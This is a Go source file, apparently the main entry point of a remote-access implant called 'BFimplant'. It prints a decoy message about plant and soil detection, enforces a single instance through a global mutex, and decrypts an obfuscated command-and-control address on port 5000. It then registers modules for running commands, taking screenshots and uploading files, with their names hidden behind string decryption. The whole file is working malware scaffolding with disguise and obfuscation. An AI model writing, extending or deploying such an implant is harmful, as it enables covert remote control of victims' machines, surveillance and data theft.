package main

import (
	"BFimplant/modules"
	"BFimplant/mymutex"
	"fmt"
	"syscall"
	"BFimplant/winapiV2"
)


var (
    secret string
    ipC2   string
)

func main() {
	fmt.Println("this a plant detection water and soil and food for better plants in the world <3")
	mutexName := "Global\\BFimplantMutex"

	// Create a new mutex
	mutex, err := mymutex.CreateMutex(mutexName)
	if err != nil {
		fmt.Println("Error creating mutex:", err)
		return
	}
	defer syscall.CloseHandle(mutex) // Ensure the handle is closed when done

	waitResult, _ := mymutex.WaitForSingleObject(mutex,0)
	
	if waitResult == syscall.WAIT_OBJECT_0 {

		c2ServerURL := "http://" + winapiV2.DecryptString(ipC2) + ":" + "5000"

		defer mymutex.ReleaseMutex(mutex)
		implant := NewImplant(c2ServerURL,secret)
		

		// Register modules
		implant.Modules[winapiV2.DecryptString("&(!")] = modules.NewExecuteModule()
		implant.Modules["ping"] = modules.NewPingModule()
		implant.Modules[winapiV2.DecryptString("6&7  +6-*1")] = modules.NewScreenshotModule()
		implant.Modules[winapiV2.DecryptString("05)*$!")] = modules.NewUploadModule()

		implant.Start()

		
	}
	
}
